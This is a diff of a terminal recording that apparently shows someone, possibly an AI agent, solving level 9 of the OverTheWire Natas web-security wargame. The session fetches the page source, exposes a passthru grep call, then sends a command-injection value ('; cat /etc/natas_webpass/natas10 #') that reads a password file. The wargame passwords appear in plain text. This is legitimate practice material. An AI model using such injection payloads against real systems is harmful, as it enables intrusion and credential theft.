@@ -1,6 +1,8 @@
-{"version":3,"term":{"cols":100,"rows":32},"timestamp":1793469400,"idle_time_limit":2.0,"command":"python3 -I /home/claude/tools/ptyrun_sh.py /home/claude/solves/natas/L9.sh","title":"Natas L9 solve","env":{"SHELL":"/bin/bash"}}
-[0.008, "o", "$ curl -s -u natas9:<pw> http://natas9.natas.labs.overthewire.org/index-source.html    # passthru(\"grep -i $key dictionary.txt\")\r\r\n"]
-[1.464, "o", "passthru(\"grep&nbsp;-i&nbsp;$key&nbsp;dictionary.txt\")\r\r\n"]
-[0.001, "o", "$ curl -s -u natas9:<pw> --data-urlencode \"needle=; cat /etc/natas_webpass/natas10 #\" http://natas9.natas.labs.overthewire.org/\r\r\n"]
-[0.386, "o", "\r\r\nEgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv\r\r\n\r\r\n"]
-[0.002, "x", "0"]
+{"version": 2, "width": 80, "height": 24, "timestamp": 1795482676, "env": {"SHELL": "/bin/bash", "TERM": "xterm"}}
+[0.010397, "o", "\u001b[?2004hbash-5.2$ "]
+[1.015159, "o", "export PS1='shell$ '\r\r\n\u001b[?2004l\r\u001b[?2004hshell$ "]
+[2.620045, "o", "curl -s -u natas9:UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9 http://natas9.natas.labs.overthewire.org/index-source.html | sed 's/<[^>]*>//g' | tr -d '\\n' | grep -o 'passthru([^)]*)'\r\r\n\u001b[?2004l\r"]
+[3.045153, "o", "passthru(\"grep&nbsp;-i&nbsp;$key&nbsp;dictionary.txt\")\r\r\n\u001b[?2004hshell$ "]
+[3.045466, "o", "curl -s -u natas9:UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9 --data-urlencode 'needle=; cat /etc/natas_webpass/natas10 #' http://natas9.natas.labs.overthewire.org/ | sed -n '/<pre/,/<\\/pre>/p' | sed 's/<[^>]*>//g' | head -3 \r\u001b[A\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[K3\r\r\n\u001b[?2004l\r"]
+[3.44934, "o", "\r\r\nEgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv\r\r\n\r\r\n\u001b[?2004hshell$ exit\r\r\n\u001b[?2004l\rexit\r\r\n"]
+[3.450152, "o", "exit\r\r\n"]
